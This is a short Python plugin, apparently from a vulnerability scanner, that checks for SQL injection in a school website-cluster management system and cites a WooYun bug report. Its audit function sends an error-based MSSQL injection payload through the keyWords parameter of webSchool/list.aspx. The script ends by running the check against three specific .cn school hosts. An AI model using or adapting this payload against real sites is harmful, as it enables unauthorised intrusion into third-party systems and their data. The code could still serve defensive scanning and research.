#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:师友网站集群管理系统通用SQL注入
#Refer:http://www.wooyun.org/bugs/wooyun-2010-082296

def assign(service,arg):
    if service=="nanjing_shiyou":
        return True,arg 
    
def  audit(arg):
    url=arg+"webSchool/list.aspx?keyWords=1%%27%20and%201>sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%20and%20%27%%27%20like%20%27"
    code,head,res,errcode,_=curl.curl2(url)
    if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole(url) 

if __name__=="__main__":
    from dummy import *
    
    audit(assign('nanjing_shiyou','http://hxxx.zajyj.cn/')[1])
    audit(assign('nanjing_shiyou','http://xyxx.zajyj.cn/')[1])
    audit(assign('nanjing_shiyou','http://rxzx.zajyj.cn/')[1])